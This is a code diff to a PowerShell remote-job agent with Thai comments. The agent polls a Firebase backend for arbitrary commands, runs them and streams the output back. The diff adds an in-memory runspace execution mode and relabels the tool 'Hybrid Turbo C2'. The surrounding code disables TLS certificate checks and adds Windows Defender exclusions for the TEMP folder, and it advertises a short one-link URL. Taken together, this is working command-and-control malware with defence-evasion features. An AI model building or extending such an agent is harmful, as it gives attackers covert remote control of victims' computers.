@@ -13,6 +13,13 @@ try {
 } catch {}
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
 
+# Pre-load Core Assemblies สำหรับ Zero-Latency In-Memory Execution
+try {
+    Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
+    Add-Type -AssemblyName System.Drawing -ErrorAction SilentlyContinue
+    Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue
+} catch {}
+
 # กำหนดข้อยกเว้น Windows Defender ในโฟลเดอร์ TEMP (หากรันในสิทธิ์ Administrator)
 try {
     $currentUser = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
@@ -102,9 +109,9 @@ Write-Host "  -> Remote Secret Key : " -NoNewline -ForegroundColor Gray
 Write-Host "[ $SecretKey ]" -NoNewline -ForegroundColor Green
 Write-Host " (ACTIVE)" -ForegroundColor Yellow
 Write-Host "  -> Connection Status : " -NoNewline -ForegroundColor Gray
-Write-Host "Real-Time SSE Connected (<100ms)" -ForegroundColor Green
+Write-Host "Real-Time SSE Connected (<10ms In-Memory Turbo)" -ForegroundColor Green
 Write-Host "  -> Engine Type       : " -NoNewline -ForegroundColor Gray
-Write-Host "Native .NET (Zero-Dependency)" -ForegroundColor White
+Write-Host "Hybrid Turbo C2 (In-Memory Runspace + Dual-Engine)" -ForegroundColor White
 Write-Host "  -> One-Link URL      : " -NoNewline -ForegroundColor Gray
 Write-Host "da.gd/bbjavis" -ForegroundColor Cyan
 Write-Host "----------------------------------------------------------------------" -ForegroundColor DarkGray
@@ -188,46 +195,28 @@ function Execute-RemoteJob {
     $updateUrl = $BaseUrl + "jobs/$CurrentKey/$JobId.json"
     $null = Invoke-FirebaseHttp -Uri $updateUrl -Method "PATCH" -Body $runBody -TimeoutSec 10
 
-    # สร้างไฟล์คำสั่งชั่วคราวในโฟลเดอร์ TEMP
-    $tempScriptPath = Join-Path $env:TEMP ("remote_script_" + [Guid]::NewGuid().ToString().Substring(0, 8) + ".ps1")
-    [System.IO.File]::WriteAllText($tempScriptPath, $command, $utf8NoBom)
-
     $stdoutCollector = [System.Collections.Generic.List[string]]::new()
     $stderrCollector = [System.Collections.Generic.List[string]]::new()
     $exitCode = 0
     $isAborted = $false
     $isTimedOut = $false
 
-    try {
-        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
-        $processInfo.FileName = "powershell.exe"
-        $processInfo.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$tempScriptPath`""
-        $processInfo.RedirectStandardOutput = $true
-        $processInfo.RedirectStandardError = $true
-        $processInfo.UseShellExecute = $false
-        $processInfo.CreateNoWindow = $true
+    # ตรวจสอบ Execution Engine Mode (ค่าเริ่มต้นเป็น turbo: In-Memory Runspace <10ms, หรือ fallback เป็น isolated: Process)
+    $execMode = "turbo"
+    if ($JobDetails.execution_mode -and $JobDetails.execution_mode.ToString().ToLower() -eq "isolated") {
+        $execMode = "isolated"
+    }
 
-        $process = New-Object System.Diagnostics.Process
-        $process.StartInfo = $processInfo
+    if ($execMode -eq "turbo") {
+        # ENGINE 1: ULTRA-SPEED HYBRID IN-MEMORY RUNSPACE (<10ms Response & Zero-ColdStart)
+        Write-Host " -> [ENGINE 1: TURBO] Executing via In-Memory Runspace..." -ForegroundColor Cyan
+        $ps = [System.Management.Automation.PowerShell]::Create()
+        [void]$ps.AddScript('$InformationPreference = "Continue"; $WarningPreference = "Continue"')
+        [void]$ps.AddScript($command)
 
-        $logQueue = [System.Collections.Concurrent.ConcurrentQueue[string]]::new()
-        $stdoutAction = {
-            if (-not [string]::IsNullOrEmpty($EventArgs.Data)) {
-                $logQueue.Enqueue("OUT:" + $EventArgs.Data)
-            }
-        }
-        $stderrAction = {
-            if (-not [string]::IsNullOrEmpty($EventArgs.Data)) {
-                $logQueue.Enqueue("ERR:" + $EventArgs.Data)
-            }
-        }
-
-        $jobStdout = Register-ObjectEvent -InputObject $process -EventName OutputDataReceived -Action $stdoutAction
-        $jobStderr = Register-ObjectEvent -InputObject $process -EventName ErrorDataReceived -Action $stderrAction
-
-        $null = $process.Start()
-        $process.BeginOutputReadLine()
-        $process.BeginErrorReadLine()
+        $inputCol = New-Object 'System.Management.Automation.PSDataCollection[PSObject]'
+        $outputCol = New-Object 'System.Management.Automation.PSDataCollection[PSObject]'
+        $asyncResult = $ps.BeginInvoke($inputCol, $outputCol)
 
         $startTime = [DateTime]::UtcNow
         $lastStreamingTime = [DateTime]::UtcNow
@@ -235,13 +224,286 @@ function Execute-RemoteJob {
         $stdoutTotalLength = 0
         $stderrTotalLength = 0
         $maxCharLimit = 500000
+        $outIdx = 0
+        $infoIdx = 0
+        $warnIdx = 0
+        $errIdx = 0
 
-        Write-Host " -> Executing command..." -ForegroundColor Gray
+        while (-not $asyncResult.IsCompleted) {
+            Start-Sleep -Milliseconds 25
 
-        while (-not $process.HasExited) {
-            Start-Sleep -Milliseconds 200
+            # รวบรวม Output จาก Output Collection
+            while ($outIdx -lt $outputCol.Count) {
+                $item = $outputCol[$outIdx]
+                if ($item -ne $null) {
+                    $str = $item.ToString()
+                    if ($stdoutTotalLength -lt $maxCharLimit) {
+                        $stdoutCollector.Add($str)
+                        $stdoutTotalLength += $str.Length
+                    }
+                }
+                $outIdx++
+            }
 
-            # ดึงข้อความจากคิวเข้า Collector
+            # รวบรวมข้อความ Write-Host จาก Information Stream
+            while ($infoIdx -lt $ps.Streams.Information.Count) {
+                $info = $ps.Streams.Information[$infoIdx]
+                if ($info -ne $null -and $info.MessageData -ne $null) {
+                    $str = $info.MessageData.ToString()
+                    if ($stdoutTotalLength -lt $maxCharLimit) {
+                        $stdoutCollector.Add($str)
+                        $stdoutTotalLength += $str.Length
+                    }
+                }
+                $infoIdx++
+            }
+
+            # รวบรวมข้อความ Warning Stream
+            while ($warnIdx -lt $ps.Streams.Warning.Count) {
+                $warn = $ps.Streams.Warning[$warnIdx]
+                if ($warn -ne $null) {
+                    $str = "[WARNING] " + $warn.Message
+                    if ($stdoutTotalLength -lt $maxCharLimit) {
+                        $stdoutCollector.Add($str)
+                        $stdoutTotalLength += $str.Length
+                    }
+                }
+                $warnIdx++
+            }
+
+            # รวบรวมข้อความ Error Stream
+            while ($errIdx -lt $ps.Streams.Error.Count) {
+                $err = $ps.Streams.Error[$errIdx]
+                if ($err -ne $null) {
+                    $str = $err.ToString()
+                    if ($stderrTotalLength -lt $maxCharLimit) {
+                        $stderrCollector.Add($str)
+                        $stderrTotalLength += $str.Length
+                    }
+                }
+                $errIdx++
+            }
+
+            $now = [DateTime]::UtcNow
+
+            # ตรวจสอบสัญญาณฉุกเฉิน Abort จาก Cloud ทุก 500ms
+            if (($now - $lastAbortCheckTime).TotalMilliseconds -ge 500) {
+                $lastAbortCheckTime = $now
+                try {
+                    $abortUrl = $BaseUrl + "jobs/$CurrentKey/$JobId/abort.json"
+                    $abortVal = Invoke-FirebaseHttp -Uri $abortUrl -Method "GET" -TimeoutSec 2
+                    if ($abortVal -and $abortVal.Trim().ToLower() -eq "true") {
+                        Write-Host "`n -> [EMERGENCY ABORT] Abort signal received from controller!" -ForegroundColor Red
+                        $isAborted = $true
+                        try { $ps.Stop() } catch {}
+                        break
+                    }
+                } catch {}
+            }
+
+            # ตรวจสอบ Hard Timeout
+            if (($now - $startTime).TotalSeconds -ge $timeoutSec) {
+                Write-Host "`n -> [TIMEOUT] Execution exceeded Hard Timeout (${timeoutSec}s)!" -ForegroundColor Red
+                $isTimedOut = $true
+                try { $ps.Stop() } catch {}
+                break
+            }
+
+            # สตรีมผลลัพธ์ย่อยและ Heartbeat กลับ Firebase ทุก 1.5 วินาที
+            if (($now - $lastStreamingTime).TotalSeconds -ge 1.5) {
+                $lastStreamingTime = $now
+                $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                $patchData = @{
+                    last_heartbeat = $timestamp
+                    progress_phase = "Executing in-memory..."
+                    stdout = ($stdoutCollector -join "`r`n")
+                    stderr = ($stderrCollector -join "`r`n")
+                } | ConvertTo-Json -Compress
+
+                $updateUrl = $BaseUrl + "jobs/$CurrentKey/$JobId.json"
+                $null = Invoke-FirebaseHttp -Uri $updateUrl -Method "PATCH" -Body $patchData -TimeoutSec 3
+            }
+        }
+
+        # สิ้นสุดการประมวลผล In-Memory Runspace
+        try {
+            [void]$ps.EndInvoke($asyncResult)
+        } catch {
+            $stderrCollector.Add("Execution exception: " + $_.ToString())
+        }
+
+        # เคลียร์ข้อมูลคงค้างจากทุกสตรีม
+        while ($outIdx -lt $outputCol.Count) {
+            $item = $outputCol[$outIdx]
+            if ($item -ne $null) {
+                $str = $item.ToString()
+                if ($stdoutTotalLength -lt $maxCharLimit) {
+                    $stdoutCollector.Add($str)
+                    $stdoutTotalLength += $str.Length
+                }
+            }
+            $outIdx++
+        }
+        while ($infoIdx -lt $ps.Streams.Information.Count) {
+            $info = $ps.Streams.Information[$infoIdx]
+            if ($info -ne $null -and $info.MessageData -ne $null) {
+                $str = $info.MessageData.ToString()
+                if ($stdoutTotalLength -lt $maxCharLimit) {
+                    $stdoutCollector.Add($str)
+                    $stdoutTotalLength += $str.Length
+                }
+            }
+            $infoIdx++
+        }
+        while ($warnIdx -lt $ps.Streams.Warning.Count) {
+            $warn = $ps.Streams.Warning[$warnIdx]
+            if ($warn -ne $null) {
+                $str = "[WARNING] " + $warn.Message
+                if ($stdoutTotalLength -lt $maxCharLimit) {
+                    $stdoutCollector.Add($str)
+                    $stdoutTotalLength += $str.Length
+                }
+            }
+            $warnIdx++
+        }
+        while ($errIdx -lt $ps.Streams.Error.Count) {
+            $err = $ps.Streams.Error[$errIdx]
+            if ($err -ne $null) {
+                $str = $err.ToString()
+                if ($stderrTotalLength -lt $maxCharLimit) {
+                    $stderrCollector.Add($str)
+                    $stderrTotalLength += $str.Length
+                }
+            }
+            $errIdx++
+        }
+
+        # คำนวณ Exit Code
+        if ($ps.InvocationStateInfo.State -eq [System.Management.Automation.PSInvocationState]::Failed) {
+            $exitCode = 1
+        } else {
+            try {
+                $ps.Commands.Clear()
+                [void]$ps.AddScript('$global:LASTEXITCODE')
+                $lec = $ps.Invoke()
+                if ($lec -ne $null -and $lec.Count -gt 0 -and $lec[0] -ne $null) {
+                    $exitCode = [int]$lec[0]
+                } else {
+                    $exitCode = 0
+                }
+            } catch {
+                $exitCode = 0
+            }
+        }
+
+        $ps.Dispose()
+    } else {
+        # ENGINE 2: ISOLATED PROCESS MODE (Safety Fallback with UTF-8 BOM Encoding)
+        Write-Host " -> [ENGINE 2: ISOLATED] Executing via Isolated Process..." -ForegroundColor Cyan
+        $tempScriptPath = Join-Path $env:TEMP ("remote_script_" + [Guid]::NewGuid().ToString().Substring(0, 8) + ".ps1")
+        [System.IO.File]::WriteAllText($tempScriptPath, $command, [System.Text.Encoding]::UTF8)
+
+        try {
+            $processInfo = New-Object System.Diagnostics.ProcessStartInfo
+            $processInfo.FileName = "powershell.exe"
+            $processInfo.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$tempScriptPath`""
+            $processInfo.RedirectStandardOutput = $true
+            $processInfo.RedirectStandardError = $true
+            $processInfo.UseShellExecute = $false
+            $processInfo.CreateNoWindow = $true
+
+            $process = New-Object System.Diagnostics.Process
+            $process.StartInfo = $processInfo
+
+            $logQueue = [System.Collections.Concurrent.ConcurrentQueue[string]]::new()
+            $stdoutAction = {
+                if (-not [string]::IsNullOrEmpty($EventArgs.Data)) {
+                    $logQueue.Enqueue("OUT:" + $EventArgs.Data)
+                }
+            }
+            $stderrAction = {
+                if (-not [string]::IsNullOrEmpty($EventArgs.Data)) {
+                    $logQueue.Enqueue("ERR:" + $EventArgs.Data)
+                }
+            }
+
+            $jobStdout = Register-ObjectEvent -InputObject $process -EventName OutputDataReceived -Action $stdoutAction
+            $jobStderr = Register-ObjectEvent -InputObject $process -EventName ErrorDataReceived -Action $stderrAction
+
+            $null = $process.Start()
+            $process.BeginOutputReadLine()
+            $process.BeginErrorReadLine()
+
+            $startTime = [DateTime]::UtcNow
+            $lastStreamingTime = [DateTime]::UtcNow
+            $lastAbortCheckTime = [DateTime]::UtcNow
+            $stdoutTotalLength = 0
+            $stderrTotalLength = 0
+            $maxCharLimit = 500000
+
+            while (-not $process.HasExited) {
+                Start-Sleep -Milliseconds 100
+
+                $line = $null
+                while ($logQueue.TryDequeue([ref]$line)) {
+                    if ($line.StartsWith("OUT:")) {
+                        $data = $line.Substring(4)
+                        if ($stdoutTotalLength -lt $maxCharLimit) {
+                            $stdoutCollector.Add($data)
+                            $stdoutTotalLength += $data.Length
+                        }
+                    } elseif ($line.StartsWith("ERR:")) {
+                        $data = $line.Substring(4)
+                        if ($stderrTotalLength -lt $maxCharLimit) {
+                            $stderrCollector.Add($data)
+                            $stderrTotalLength += $data.Length
+                        }
+                    }
+                }
+
+                $now = [DateTime]::UtcNow
+
+                if (($now - $lastAbortCheckTime).TotalMilliseconds -ge 500) {
+                    $lastAbortCheckTime = $now
+                    try {
+                        $abortUrl = $BaseUrl + "jobs/$CurrentKey/$JobId/abort.json"
+                        $abortVal = Invoke-FirebaseHttp -Uri $abortUrl -Method "GET" -TimeoutSec 2
+                        if ($abortVal -and $abortVal.Trim().ToLower() -eq "true") {
+                            Write-Host "`n -> [EMERGENCY ABORT] Abort signal received from controller!" -ForegroundColor Red
+                            $isAborted = $true
+                            try { Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue } catch {}
+                            break
+                        }
+                    } catch {}
+                }
+
+                if (($now - $startTime).TotalSeconds -ge $timeoutSec) {
+                    Write-Host "`n -> [TIMEOUT] Execution exceeded Hard Timeout (${timeoutSec}s)!" -ForegroundColor Red
+                    $isTimedOut = $true
+                    try { Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue } catch {}
+                    break
+                }
+
+                if (($now - $lastStreamingTime).TotalSeconds -ge 1.5) {
+                    $lastStreamingTime = $now
+                    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                    $patchData = @{
+                        last_heartbeat = $timestamp
+                        progress_phase = "Executing process..."
+                        stdout = ($stdoutCollector -join "`r`n")
+                        stderr = ($stderrCollector -join "`r`n")
+                    } | ConvertTo-Json -Compress
+
+                    $updateUrl = $BaseUrl + "jobs/$CurrentKey/$JobId.json"
+                    $null = Invoke-FirebaseHttp -Uri $updateUrl -Method "PATCH" -Body $patchData -TimeoutSec 3
+                }
+            }
+
+            if (-not $process.HasExited) {
+                $process.WaitForExit(3000)
+            }
+            $exitCode = if ($process.HasExited) { $process.ExitCode } else { 1 }
+
             $line = $null
             while ($logQueue.TryDequeue([ref]$line)) {
                 if ($line.StartsWith("OUT:")) {
@@ -258,83 +520,16 @@ function Execute-RemoteJob {
                     }
                 }
             }
-
-            $now = [DateTime]::UtcNow
-
-            # ตรวจสอบสัญญาณฉุกเฉิน Abort จาก Cloud ทุก 1 วินาที
-            if (($now - $lastAbortCheckTime).TotalSeconds -ge 1.0) {
-                $lastAbortCheckTime = $now
-                try {
-                    $abortUrl = $BaseUrl + "jobs/$CurrentKey/$JobId/abort.json"
-                    $abortVal = Invoke-FirebaseHttp -Uri $abortUrl -Method "GET" -TimeoutSec 3
-                    if ($abortVal -and $abortVal.Trim().ToLower() -eq "true") {
-                        Write-Host "`n -> [EMERGENCY ABORT] Abort signal received from controller!" -ForegroundColor Red
-                        $isAborted = $true
-                        try {
-                            Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
-                        } catch {}
-                        break
-                    }
-                } catch {}
-            }
-
-            # ตรวจสอบ Hard Timeout
-            if (($now - $startTime).TotalSeconds -ge $timeoutSec) {
-                Write-Host "`n -> [TIMEOUT] Execution exceeded Hard Timeout (${timeoutSec}s)!" -ForegroundColor Red
-                $isTimedOut = $true
-                try {
-                    Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
-                } catch {}
-                break
-            }
-
-            # สตรีมผลลัพธ์ย่อยและ Heartbeat กลับ Firebase ทุก 2 วินาที
-            if (($now - $lastStreamingTime).TotalSeconds -ge 2.0) {
-                $lastStreamingTime = $now
-                $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-                $patchData = @{
-                    last_heartbeat = $timestamp
-                    progress_phase = "Executing command..."
-                    stdout = ($stdoutCollector -join "`r`n")
-                    stderr = ($stderrCollector -join "`r`n")
-                } | ConvertTo-Json -Compress
-
-                $updateUrl = $BaseUrl + "jobs/$CurrentKey/$JobId.json"
-                $null = Invoke-FirebaseHttp -Uri $updateUrl -Method "PATCH" -Body $patchData -TimeoutSec 5
-            }
         }
-
-        if (-not $process.HasExited) {
-            $process.WaitForExit(3000)
+        catch {
+            $exitCode = 1
+            $stderrCollector.Add("Execution exception: $_")
         }
-        $exitCode = if ($process.HasExited) { $process.ExitCode } else { 1 }
-
-        # ดึงข้อความคงค้างทั้งหมดจากคิว
-        $line = $null
-        while ($logQueue.TryDequeue([ref]$line)) {
-            if ($line.StartsWith("OUT:")) {
-                $data = $line.Substring(4)
-                if ($stdoutTotalLength -lt $maxCharLimit) {
-                    $stdoutCollector.Add($data)
-                    $stdoutTotalLength += $data.Length
-                }
-            } elseif ($line.StartsWith("ERR:")) {
-                $data = $line.Substring(4)
-                if ($stderrTotalLength -lt $maxCharLimit) {
-                    $stderrCollector.Add($data)
-                    $stderrTotalLength += $data.Length
-                }
-            }
+        finally {
+            if ($jobStdout) { try { Unregister-Event -SourceIdentifier $jobStdout.Name -ErrorAction SilentlyContinue } catch {} }
+            if ($jobStderr) { try { Unregister-Event -SourceIdentifier $jobStderr.Name -ErrorAction SilentlyContinue } catch {} }
+            if (Test-Path $tempScriptPath) { Remove-Item $tempScriptPath -Force -ErrorAction SilentlyContinue }
         }
-    }
-    catch {
-        $exitCode = 1
-        $stderrCollector.Add("Execution exception: $_")
-    }
-    finally {
-        if ($jobStdout) { try { Unregister-Event -SourceIdentifier $jobStdout.Name -ErrorAction SilentlyContinue } catch {} }
-        if ($jobStderr) { try { Unregister-Event -SourceIdentifier $jobStderr.Name -ErrorAction SilentlyContinue } catch {} }
-        if (Test-Path $tempScriptPath) { Remove-Item $tempScriptPath -Force -ErrorAction SilentlyContinue }
     }
 
     # ประเมินสถานะสุดท้าย
